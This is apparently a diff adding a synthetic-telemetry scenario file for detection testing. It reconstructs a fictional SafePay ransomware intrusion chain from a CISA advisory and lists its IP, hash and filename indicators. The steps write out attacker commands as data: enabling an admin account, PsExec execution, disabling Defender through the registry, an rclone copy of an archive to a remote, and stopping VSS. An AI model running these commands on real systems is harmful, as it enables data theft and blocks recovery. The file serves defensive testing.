@@ -1,0 +1,1448 @@
+{
+  "schema_version": 1,
+  "id": "cisa-aa26-293a-safepay-composite-v1",
+  "output_name": "safepay-v1",
+  "title": "SafePay: privileged remote access, collection, transfer and historical IOC coverage",
+  "description": "AA26-293A October 20 2026 adaptation. Core chain is fictional and source-informed; historical blocks are independent matching fixtures, not one victim timeline. Source inventory and limits are in companion notes.",
+  "steps": [
+    {
+      "id": "credential-access",
+      "offset_seconds": 60,
+      "description": "Fictional stolen privileged credentials: failed then successful RDP access. CISA describes credential abuse and RDP, but this source address is not asserted to be Mullvad and the upstream VPN/phishing is not simulated.",
+      "depends_on": [],
+      "observations": [
+        {
+          "source": "windows-security.jsonl",
+          "dataset": "Authentication.Authentication",
+          "fields": {
+            "src": "77.37.49.40",
+            "dest": {
+              "ref": "asset:prod-rdp-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "action": "failure",
+            "app": "rdp"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "windows-security.jsonl",
+          "dataset": "Authentication.Authentication",
+          "fields": {
+            "src": "77.37.49.40",
+            "dest": {
+              "ref": "asset:prod-rdp-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "action": "failure",
+            "app": "rdp"
+          },
+          "delay_ms": 1000
+        },
+        {
+          "source": "windows-security.jsonl",
+          "dataset": "Authentication.Authentication",
+          "fields": {
+            "src": "77.37.49.40",
+            "dest": {
+              "ref": "asset:prod-rdp-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "action": "success",
+            "app": "rdp"
+          },
+          "delay_ms": 2000
+        }
+      ]
+    },
+    {
+      "id": "account-manipulation",
+      "offset_seconds": 300,
+      "description": "Source behavior: existing-account manipulation. Fictional administrative command and change observation; account privileges and credential state are not enforced.",
+      "depends_on": [
+        "credential-access"
+      ],
+      "observations": [
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Processes",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-rdp-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "process": "C:\\Windows\\System32\\net.exe",
+            "process_id": 5100,
+            "process_cmdline": "net user admin /active:yes"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "windows-security.jsonl",
+          "dataset": "Change.All_Changes",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-rdp-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "action": "modified",
+            "object": "LAB\\admin",
+            "requested_action": "enable"
+          },
+          "delay_ms": 0
+        }
+      ]
+    },
+    {
+      "id": "share-discovery",
+      "offset_seconds": 600,
+      "description": "Source ShareFinder/SharpShares/nltest behavior; exact arguments, staging directory and host are fictional. Launches do not prove successful enumeration.",
+      "depends_on": [
+        "account-manipulation"
+      ],
+      "observations": [
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Processes",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-rdp-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "process": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "process_id": 5101,
+            "process_cmdline": "powershell.exe -File C:\\ProgramData\\Ops\\ShareFinder.ps1"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Processes",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-rdp-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "process": "C:\\ProgramData\\Ops\\SharpShares.exe",
+            "process_id": 5102,
+            "process_hash": "BBDD3620A67AEDEC4B9A68B2C9CC880B6631215E129816AEA19902A6F4BC6F41"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Processes",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-rdp-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "process": "C:\\Windows\\System32\\nltest.exe",
+            "process_id": 5103,
+            "process_cmdline": "nltest.exe /domain_trusts"
+          },
+          "delay_ms": 0
+        }
+      ]
+    },
+    {
+      "id": "lateral-service",
+      "offset_seconds": 1200,
+      "description": "Source PsExec/SMB remote service execution. Fictional command and already-compromised domain-admin context; source inventory declares SMB on file server.",
+      "depends_on": [
+        "share-discovery"
+      ],
+      "observations": [
+        {
+          "source": "eastwest-firewall.jsonl",
+          "dataset": "Network_Traffic.All_Traffic",
+          "fields": {
+            "src": {
+              "ref": "asset:prod-rdp-01:ip"
+            },
+            "dest": {
+              "ref": "asset:prod-file-01:ip"
+            },
+            "dest_port": 445,
+            "transport": "tcp",
+            "action": "allowed"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "windows-security.jsonl",
+          "dataset": "Authentication.Authentication",
+          "fields": {
+            "src": {
+              "ref": "asset:prod-rdp-01:ip"
+            },
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "action": "success",
+            "app": "smb"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Processes",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-rdp-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "process": "C:\\ProgramData\\Ops\\PsExec.exe",
+            "process_id": 5104,
+            "process_cmdline": "PsExec.exe \\\\prod-file-01 cmd.exe /c whoami"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Processes",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "process": "C:\\Windows\\System32\\cmd.exe",
+            "process_id": 6100,
+            "parent_process": "C:\\Windows\\PSEXESVC.exe",
+            "process_cmdline": "cmd.exe /c whoami"
+          },
+          "delay_ms": 0
+        }
+      ]
+    },
+    {
+      "id": "security-change",
+      "offset_seconds": 1800,
+      "description": "Source security-tool impairment behavior. Fictional Defender registry-write observation only: no claim the protection was effectively disabled or the sensor stopped.",
+      "depends_on": [
+        "lateral-service"
+      ],
+      "observations": [
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Registry",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "registry_path": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender",
+            "registry_value_data": "DisableAntiSpyware=1",
+            "action": "modified"
+          },
+          "delay_ms": 0
+        }
+      ]
+    },
+    {
+      "id": "file-collection",
+      "offset_seconds": 2400,
+      "description": "Fictional sensitive-file read followed by source-reported WinRAR use. Exact source file, archive, arguments and amount are invented; read/process events do not prove exfiltrated content.",
+      "depends_on": [
+        "security-change"
+      ],
+      "observations": [
+        {
+          "source": "windows-file.jsonl",
+          "dataset": "Data_Access.Data_Access",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "object": "project-plan.csv",
+            "object_path": "D:\\Shares\\Projects\\project-plan.csv",
+            "action": "read",
+            "access_result": "success"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Processes",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "process": "C:\\ProgramData\\Ops\\winrar.exe",
+            "process_id": 6101,
+            "process_cmdline": "winrar.exe a C:\\ProgramData\\Ops\\project.rar D:\\Shares\\Projects\\project-plan.csv"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Ops\\project.rar",
+            "action": "created"
+          },
+          "delay_ms": 0
+        }
+      ]
+    },
+    {
+      "id": "transfer",
+      "offset_seconds": 3000,
+      "description": "Source-reported Rclone plus an exfiltration-listed IP. Configuration, connection port, duration and bytes are fictional; no domain/IP or cloud-provider association inferred.",
+      "depends_on": [
+        "file-collection"
+      ],
+      "observations": [
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Processes",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "process": "C:\\ProgramData\\Ops\\rclone.exe",
+            "process_id": 6102,
+            "process_cmdline": "rclone.exe copy C:\\ProgramData\\Ops\\project.rar remote:archive"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "egress-firewall.jsonl",
+          "dataset": "Network_Traffic.All_Traffic",
+          "fields": {
+            "src": {
+              "ref": "asset:prod-file-01:ip"
+            },
+            "dest": "5.255.11.134",
+            "dest_port": 443,
+            "transport": "tcp",
+            "action": "allowed",
+            "bytes_out": 52428800,
+            "bytes_in": 2048,
+            "bytes": 52430848,
+            "duration": 180
+          },
+          "delay_ms": 0
+        }
+      ]
+    },
+    {
+      "id": "recovery-inhibition",
+      "offset_seconds": 3600,
+      "description": "Source VSS-stop behavior represented as a command launch; no proof the service stopped. NAS factory-reset telemetry omitted because no NAS/control model exists.",
+      "depends_on": [
+        "transfer"
+      ],
+      "observations": [
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Processes",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "process": "C:\\Windows\\System32\\sc.exe",
+            "process_id": 6103,
+            "process_cmdline": "sc.exe stop VSS"
+          },
+          "delay_ms": 0
+        }
+      ]
+    },
+    {
+      "id": "impact-artifacts",
+      "offset_seconds": 4200,
+      "description": "Source ransomware hash and .SafePay suffix. Fictional placement, invocation and rename evidence; no executable bytes, encryption/decryption or successful impact simulation.",
+      "depends_on": [
+        "recovery-inhibition"
+      ],
+      "observations": [
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Ops\\1.exe",
+            "action": "created",
+            "file_hash": "07353237350C35D6DC2C8F143B649CD07C71F62B"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Processes",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "process": "C:\\ProgramData\\Ops\\1.exe",
+            "process_id": 6104,
+            "process_hash": "07353237350C35D6DC2C8F143B649CD07C71F62B"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "D:\\Shares\\Projects\\project-plan.csv.SafePay",
+            "action": "renamed"
+          },
+          "delay_ms": 0
+        }
+      ]
+    },
+    {
+      "id": "cleanup",
+      "offset_seconds": 4500,
+      "description": "Source possible self-deletion represented by a file-delete observation, with fictional ordering after impact; no claim every SafePay sample self-deletes.",
+      "depends_on": [
+        "impact-artifacts"
+      ],
+      "observations": [
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Ops\\1.exe",
+            "action": "deleted"
+          },
+          "delay_ms": 0
+        }
+      ]
+    },
+    {
+      "id": "historical-ip-coverage",
+      "offset_seconds": 4800,
+      "description": "Independent historical matching fixtures: all nine STIX IPs. Fictional outbound port-443 flows; reported intrusion/hosting/panel/exfil/C2 roles do not prove these flows served those roles. No current maliciousness or single-victim causal claim.",
+      "depends_on": [],
+      "observations": [
+        {
+          "source": "egress-firewall.jsonl",
+          "dataset": "Network_Traffic.All_Traffic",
+          "fields": {
+            "src": {
+              "ref": "asset:prod-file-01:ip"
+            },
+            "dest": "77.37.49.40",
+            "dest_port": 443,
+            "transport": "tcp",
+            "action": "allowed"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "egress-firewall.jsonl",
+          "dataset": "Network_Traffic.All_Traffic",
+          "fields": {
+            "src": {
+              "ref": "asset:prod-file-01:ip"
+            },
+            "dest": "88.119.167.239",
+            "dest_port": 443,
+            "transport": "tcp",
+            "action": "allowed"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "egress-firewall.jsonl",
+          "dataset": "Network_Traffic.All_Traffic",
+          "fields": {
+            "src": {
+              "ref": "asset:prod-file-01:ip"
+            },
+            "dest": "173.194.194.94",
+            "dest_port": 443,
+            "transport": "tcp",
+            "action": "allowed"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "egress-firewall.jsonl",
+          "dataset": "Network_Traffic.All_Traffic",
+          "fields": {
+            "src": {
+              "ref": "asset:prod-file-01:ip"
+            },
+            "dest": "37.10.71.188",
+            "dest_port": 443,
+            "transport": "tcp",
+            "action": "allowed"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "egress-firewall.jsonl",
+          "dataset": "Network_Traffic.All_Traffic",
+          "fields": {
+            "src": {
+              "ref": "asset:prod-file-01:ip"
+            },
+            "dest": "104.26.2.223",
+            "dest_port": 443,
+            "transport": "tcp",
+            "action": "allowed"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "egress-firewall.jsonl",
+          "dataset": "Network_Traffic.All_Traffic",
+          "fields": {
+            "src": {
+              "ref": "asset:prod-file-01:ip"
+            },
+            "dest": "5.255.11.134",
+            "dest_port": 443,
+            "transport": "tcp",
+            "action": "allowed"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "egress-firewall.jsonl",
+          "dataset": "Network_Traffic.All_Traffic",
+          "fields": {
+            "src": {
+              "ref": "asset:prod-file-01:ip"
+            },
+            "dest": "140.82.114.4",
+            "dest_port": 443,
+            "transport": "tcp",
+            "action": "allowed"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "egress-firewall.jsonl",
+          "dataset": "Network_Traffic.All_Traffic",
+          "fields": {
+            "src": {
+              "ref": "asset:prod-file-01:ip"
+            },
+            "dest": "167.235.225.149",
+            "dest_port": 443,
+            "transport": "tcp",
+            "action": "allowed"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "egress-firewall.jsonl",
+          "dataset": "Network_Traffic.All_Traffic",
+          "fields": {
+            "src": {
+              "ref": "asset:prod-file-01:ip"
+            },
+            "dest": "185.199.108.133",
+            "dest_port": 443,
+            "transport": "tcp",
+            "action": "allowed"
+          },
+          "delay_ms": 0
+        }
+      ]
+    },
+    {
+      "id": "historical-hash-coverage",
+      "offset_seconds": 4860,
+      "description": "Independent file-metadata fixtures for every supplied hash, including all four alternatives of the SharpShares OR indicator. Filename associations use publication tables where available; generic injected/runpe names and all paths/placements are fictional. SSDEEP is exact metadata, not fuzzy similarity; no bytes or execution are inferred.",
+      "depends_on": [],
+      "observations": [
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Samples\\soc.dll",
+            "action": "created",
+            "file_hash": "921DF888AAABCD828A3723F4C9F5FE8B8379C6B7067D16B2EA10152300417EAE"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Samples\\1.exe",
+            "action": "created",
+            "file_hash": "07353237350C35D6DC2C8F143B649CD07C71F62B"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Samples\\injected-pe.bin",
+            "action": "created",
+            "file_hash": "E79608CF1D6B51324C14BEF8883054C1238ED5F080222CC464810E6E14ADC346"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Samples\\locker.dll",
+            "action": "created",
+            "file_hash": "B498A2683640C983BB069FA2EA9E67CEF4A3797D"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Samples\\SharpShares.exe",
+            "action": "created",
+            "file_hash": "C13BC01D6630D6E51F5DC3D3B0D90D8D499FF240"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Samples\\SharpShares.exe",
+            "action": "created",
+            "file_hash": "BBDD3620A67AEDEC4B9A68B2C9CC880B6631215E129816AEA19902A6F4BC6F41"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Samples\\SharpShares.exe",
+            "action": "created",
+            "file_hash": "37C1E6931A14601BB136DF5985BEB0A1"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Samples\\SharpShares.exe",
+            "action": "created",
+            "file_hash_ssdeep": "384:px+JDZS7LRJyibXRmymaahSmCS8HVcS8C6YK6P+H+0Np0FO:pxeiJK4HDKZ32O"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Samples\\nxc.exe",
+            "action": "created",
+            "file_hash": "D711A5AF5AED48A3B36B98F4FCF52809AEBEF7A2"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Samples\\locker.dll",
+            "action": "created",
+            "file_hash": "BBFED53E3BB1F306F4DA97D995CF4AE5B73AD081"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Samples\\runpe-bundle.dll",
+            "action": "created",
+            "file_hash": "6C1D36DF94EBE367823E73BA33CFB4F40756A5E8EE1E30E8F0AE55D47E220A6A"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Samples\\locker.dll",
+            "action": "created",
+            "file_hash": "327B8B61EB446CC4F710771E44484F62B804AE3D262B57A56575053E2DF67917"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Samples\\locker.dll",
+            "action": "created",
+            "file_hash": "A0DC80A37EB7E2716C02A94ADC8DF9BAEDEC192A77BDE31669FAED228D9FF526"
+          },
+          "delay_ms": 0
+        }
+      ]
+    },
+    {
+      "id": "historical-file-coverage",
+      "offset_seconds": 4920,
+      "description": "Independent metadata fixtures for all filename alternatives in PDF Table 3. Wildcards instantiated with sample; placement is fictional. Legitimate utilities and benign artifacts are retained as qualified matching leads, not execution or infection proof.",
+      "depends_on": [],
+      "observations": [
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Ops\\1 - Copy.bat",
+            "action": "created"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Ops\\CCleaner.exe",
+            "action": "created"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Ops\\CCleaner64.exe",
+            "action": "created"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Ops\\CCleanersample.exe",
+            "action": "created"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Ops\\sample.dll",
+            "action": "created"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Ops\\dcsync.exe",
+            "action": "created"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Ops\\domains.txt",
+            "action": "created"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Ops\\DYRasWtb.exe",
+            "action": "created"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Ops\\libsmb2.dll",
+            "action": "created"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Ops\\Libwasample.dll",
+            "action": "created"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Ops\\License.txt",
+            "action": "created"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Ops\\locker.dll",
+            "action": "created"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Ops\\netscan.exe",
+            "action": "created"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Ops\\netscan.lic",
+            "action": "created"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Ops\\netscan.xml",
+            "action": "created"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Ops\\netscanNEW.zip",
+            "action": "created"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Ops\\nltest.exe",
+            "action": "created"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Ops\\oui.txt",
+            "action": "created"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Ops\\ping.txt",
+            "action": "created"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Ops\\portable.dat",
+            "action": "created"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Ops\\scan.xml",
+            "action": "created"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Ops\\sharefinder.ps1",
+            "action": "created"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
